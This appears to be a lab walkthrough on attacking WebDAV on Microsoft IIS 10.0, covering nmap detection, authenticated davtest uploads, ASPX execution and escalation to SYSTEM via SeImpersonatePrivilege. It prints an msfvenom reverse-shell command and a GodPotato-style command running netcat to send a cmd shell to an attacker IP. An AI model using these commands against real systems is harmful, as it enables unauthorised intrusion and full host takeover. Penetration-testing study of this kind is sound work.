
## Overview

**WebDAV** extends HTTP so a web server can behave more like a network file system.

In this walkthrough, WebDAV is exposed through **Microsoft IIS 10.0** on port `80`.

The key discovery from Nmap was that the server allowed multiple WebDAV-related HTTP methods:

```text
OPTIONS
TRACE
GET
HEAD
POST
PROPFIND
PROPPATCH
MKCOL
PUT
DELETE
COPY
MOVE
LOCK
UNLOCK
```

This is important because methods such as `PUT`, `MKCOL`, `PROPFIND`, and `DELETE` may allow authenticated users to interact with the web root or WebDAV directories.

> [!important]
> WebDAV on an IIS server should be tested carefully because successful upload and execution of server-side files can lead to code execution.

# Why WebDAV Matters

WebDAV can allow interaction with a web server over HTTP in ways similar to file transfer.

Possible actions include:

```text
listing resources
creating directories
uploading files
moving files
copying files
deleting files
locking resources
unlocking resources
```

For assessment purposes, interesting questions include:

```text
Does WebDAV require authentication?
Can we upload files?
Which file extensions are accepted?
Which file extensions execute?
Can we upload server-side code?
Can uploaded files be reached over HTTP?
```

# Initial WebDAV Detection

## Nmap Service Scan

```bash
sudo nmap -sV -sC -T 4 -p- -Pn -oN nmap_hutch 192.168.201.122
```

Relevant flags:

| Flag | Purpose |
|---|---|
| `-sV` | Service and version detection |
| `-sC` | Default NSE scripts |
| `-T 4` | Aggressive timing |
| `-p-` | Scan all TCP ports |
| `-Pn` | Skip host discovery |
| `-oN` | Save normal output |

Useful WebDAV indicators:

```text
http-methods
http-webdav-scan
Microsoft-IIS/10.0
Allowed Methods containing PUT, PROPFIND, MKCOL, DELETE, MOVE
```

# WebDAV Decision Points

```text
If WebDAV methods are exposed:
    test authentication requirement

If anonymous access fails:
    continue domain enumeration for credentials

If credentials are found:
    rerun davtest with authentication

If PUT succeeds:
    file upload is possible

If ASPX execution succeeds:
    IIS may execute uploaded ASPX payloads

If uploaded payload executes:
    attempt command execution or shell access within scope
```

# Creating a Payload

The walkthrough creates a Windows x64 reverse shell executable using `msfvenom`.

Command:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=443 -f exe -o shell.exe
```

Payload details:

| Option | Meaning |
|---|---|
| `-p windows/x64/shell_reverse_tcp` | Windows x64 reverse TCP shell payload |
| `LHOST=192.168.45.190` | Attacker listener IP |
| `LPORT=443` | Attacker listener port |
| `-f exe` | Output format as Windows executable |
| `-o shell.exe` | Output filename |

# SeImpersonatePrivilege Observation

The IIS app pool account had:

```text
SeImpersonatePrivilege
```

Why it matters:

```text
SeImpersonatePrivilege can be high risk
it may enable escalation to SYSTEM with potato-style attacks or similar techniques
```

The walkthrough uses a GodPotato-style approach.

Command shown:

```powershell
PS C:\Windows\Temp> .\gotpotato4.exe -cmd "C:\Windows\Temp\nc64.exe -e cmd 192.168.45.190 443"
```

Observed result:

```text
NT AUTHORITY\SYSTEM
```

> [!warning]
> Privilege escalation from a web shell modifies the risk profile significantly. Confirm scope before running local privilege escalation tooling.

# Practical WebDAV Workflow

```text
1. Identify WebDAV methods with Nmap.
2. Note whether PUT, PROPFIND, MKCOL, DELETE, MOVE are allowed.
3. Test anonymous access with davtest.
4. If authentication is required, enumerate for credentials elsewhere.
5. Rerun davtest with credentials.
6. Confirm upload capability.
7. Identify executable extensions.
8. If ASPX executes on IIS, prepare ASPX web shell or payload chain.
9. Upload files using cadaver or another WebDAV client.
10. Trigger uploaded content over HTTP.
11. Check shell context.
12. Enumerate privileges.
13. If SeImpersonatePrivilege exists and in scope, consider local privilege escalation.
14. Collect AD data if useful.
15. Clean up uploaded files and test artifacts.
```

# Troubleshooting

## davtest Fails Without Credentials

Likely reason:

```text
anonymous WebDAV access is disabled
```

Next step:

```text
enumerate LDAP, SMB, or other services for credentials
```

---

## PUT Succeeds but Execution Fails

Possible reasons:

```text
uploaded extension is not executable
IIS handler mapping does not execute that type
directory does not allow script execution
payload path is incorrect
authentication required to access file
```

---

## ASPX Upload Works but Shell Fails

Check:

```text
listener IP
listener port
firewall egress
payload architecture
web shell path
IIS execution permissions
AV/EDR interference
```

---

## Shell Runs as Low Privileged IIS User

Expected context:

```text
iis apppool\defaultapppool
```

Next checks:

```text
whoami
whoami /groups
whoami /priv
local users
local groups
```

# Key Takeaways

- WebDAV was identified on IIS through Nmap HTTP methods and `http-webdav-scan`.
- Risky methods included `PUT`, `PROPFIND`, `MKCOL`, `DELETE`, `MOVE`, and others.
- Anonymous WebDAV access was not allowed.
- Valid LDAP-discovered credentials allowed authenticated WebDAV testing.
- `davtest` confirmed upload capability and ASPX execution.
- IIS processing of ASPX made web shell execution viable.
- The shell landed as `iis apppool\defaultapppool`.
- `SeImpersonatePrivilege` provided a possible local privilege escalation path.
- SharpHound can be run after access to collect AD relationship data.
- Clean up uploaded WebDAV and payload artifacts after testing.
